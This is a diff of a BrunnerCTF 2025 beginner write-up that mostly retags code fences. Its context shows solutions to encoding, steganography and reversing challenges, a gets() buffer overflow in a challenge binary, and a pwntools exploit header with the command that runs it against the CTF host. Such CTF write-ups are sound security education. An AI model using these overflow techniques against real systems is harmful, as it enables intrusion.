@@ -21,7 +21,7 @@ In this post, I’ll walk you through my journey solving most of the beginner ta
 
 I found this flag by just reading the challenge description... Here is a snip from the last part of that challenge description:
 
-```
+```plaintext
 Let's Go!
 Before you move on, please read the rules of the CTF carefully. They contain important notes on what you're allowed to and not.
 
@@ -40,7 +40,7 @@ The zip file attached to the challenge had the following highlighted files:
 
 The `based.txt` file had long lines of binary code. This was the content of the `encode.py` file:
 
-```python=
+```python
 def encode_char(ch: str, base: int) -> str:
     """
     Encode a single character into a string of digits in the given base
@@ -68,7 +68,7 @@ with open("based.txt", "w") as f:
 ## Understand the Encoding
 
 The provided script encode.py converts the flag into different number bases, starting from base 10 down to base 2:
-```
+```python
 for base in range(10, 1, -1):
     text = " ".join(encode_char(ch, base) for ch in text)
 ```
@@ -157,7 +157,6 @@ bytes8 = [b for b in bytes8 if len(b) == 8]   # drop incomplete trailing bits
 # 4) ASCII decode
 decoded = ''.join(chr(int(b, 2)) for b in bytes8)
 print(decoded)
-
 ```
 The script is looking for a hidden message in the weirdly capitalized paragraph. It does this by turning capital and lowercase letters into binary (1s and 0s), grouping them into bytes, and then decoding those bytes into text.
 
@@ -183,7 +182,8 @@ Example:
 At this point, the script has a very long chain of binary digits (1s and 0s).
 
 It then goes ahead to group into chunks of 8 bits (bytes)
-```bytes8 = [bits[i:i+8] for i in range(0, len(bits), 8)]
+```python
+bytes8 = [bits[i:i+8] for i in range(0, len(bits), 8)]
 bytes8 = [b for b in bytes8 if len(b) == 8]
 ```
 
@@ -198,7 +198,8 @@ Example:
 "01000001 01100010 01100011 ..."
 
 Then it decodes binary into text
-```decoded = ''.join(chr(int(b, 2)) for b in bytes8)
+```python
+decoded = ''.join(chr(int(b, 2)) for b in bytes8)
 print(decoded)
 ```
 Each 8-bit binary number is converted into its ASCII character.
@@ -227,7 +228,7 @@ and a Python script that performed the encryption.
 ## Looking at the Code
 
 Here’s the core part of the script that does the “mixing”:
-```
+```python
 shaker = 0
 for ingredient in ingredients:
     shaker ^= len(ingredient) * random.randrange(18)
@@ -563,7 +564,7 @@ Translation?
 ## Inspecting the Source Code
 
 The provided `recipe.c` code snippet showed this:
-```
+```C
 void vulnerable_dough_recipe() {
     char recipe[16];
     puts("Please enter the name of the recipe you want to retrieve:");
@@ -576,7 +577,7 @@ Key things to note:
 - Buffer size is 16 bytes.
 - Uses gets(), which doesn’t stop reading, allowing overflow.
 - There’s a hidden function:
-```
+```C
 void secret_dough_recipe(void) {
     int fd = open("flag.txt", O_RDONLY);
     sendfile(1, fd, NULL, 100);
@@ -614,7 +615,7 @@ From the source:
 ## Writing the Exploit
 
 Here’s the final Python exploit with pwntools:
-```
+```python
 #!/usr/bin/env python3
 from pwn import *
 import argparse
@@ -651,12 +652,12 @@ io.interactive()
 ## Exploiting the Remote Service
 
 With everything ready, I ran:
-```
+```bash
 python3 exploits.py --remote dat-overflow-dough-b9ac089d9249f9ee.challs.brunnerne.xyz:443
 ```
 
 Output:
-```
+```plaintext
 [*] Using secret address: 0x4011b6
 [*] Switching to interactive mode
 
@@ -672,7 +673,7 @@ This was the challenge description:
 ![chall_desc](https://gist.github.com/user-attachments/assets/87dc1b3e-1f95-44a0-9bea-2d40ef449c5b)
 
 Notice that we need to download the file attached and also connect to the challenge. I downloaded the zip file, unzipped it and found the python script below:
-```python=
+```python
 cat auth.py 
 print("""
               🎂🍰🍰🍰🍰🍰🍰🍰🍰🍰🍰🍰🍰🍰🍰🎂
@@ -843,7 +844,7 @@ File: rolling_pin (64-bit ELF)
 ## Recon (Understanding the Binary)
 
 First, check what kind of file we’re dealing with:
-```
+```bash
 file rolling_pin
 ```
 Output: `ELF 64-bit LSB executable, x86-64, dynamically linked, ...`
@@ -853,12 +854,12 @@ Cool — it’s a 64-bit Linux executable.
 ## Load it into radare2
 
 We open the file in analysis mode:
-```
+```bash
 r2 -AA rolling_pin
 ```
 
 Find the main function:
-```
+```bash
 afl | grep main
 s main
 pdf
@@ -868,12 +869,12 @@ This shows the main logic where the binary checks your input.
 ## Look for Strings
 
 Check for readable strings:
-```
+```bash
 iz
 ```
 
 Found:
-```
+```plaintext
 Good job!
 Try again!
 ```
@@ -882,12 +883,12 @@ This tells us where the program decides if your input is correct or wrong.
 ## Look at the Data
 
 We inspect memory regions near where the program compares inputs:
-```
+```bash
 px 32 @ 0x00402010
 ```
 
 Output:
-```
+```plaintext
 62e4 d573 e6ac 9cbd 7260 d1a1 4766 d73a
 6866 7d23 03ae d934 7d52 6f6c 6c20 7468
 ```
@@ -907,7 +908,7 @@ So, to reverse it, we rotate right instead of left.
 ## Write the Decoder
 
 A simple Python script to reverse the rotation:
-```python=
+```python
 data = [0x62, 0xe4, 0xd5, 0x73, 0xe6, 0xac, 0x9c, 0xbd, 0x72, 0x60,
         0xd1, 0xa1, 0x47, 0x66, 0xd7, 0x3a, 0x68, 0x66, 0x7d, 0x23,
         0x03, 0xae, 0xd9, 0x34, 0x7d]
@@ -924,7 +925,7 @@ Running it gives:`brunner{r0t4t3_th3_d0ugh}`
 ## Test the Flag
 
 Feed it into the binary:
-```
+```plaintext
 echo "brunner{r0t4t3_th3_d0ugh}" | ./rolling_pin
 ```
 Output:`Good job!`
@@ -987,5 +988,6 @@ I therefore went ahead and supplied the file name of the file we are required to
 ![root_flag](https://gist.github.com/user-attachments/assets/ab154124-c226-440d-bc0e-184d981f7de0)
 
 flag: `brunner{5uD0_pR1V1L3g35_T00_h0t_F0r_J4v4_J4CK!}`
+
 
 Wrapping up, BrunnerCTF 2025 was a fun and insightful experience that sharpened my problem-solving skills and deepened my understanding of core cybersecurity concepts. The “Shake & Bake” challenges were perfect for practicing fundamentals while still offering a few clever twists to keep things exciting. I’m looking forward to tackling more advanced challenges next time and continuing to refine my skills. Until then — happy hacking, and see you in the next CTF! 🚩
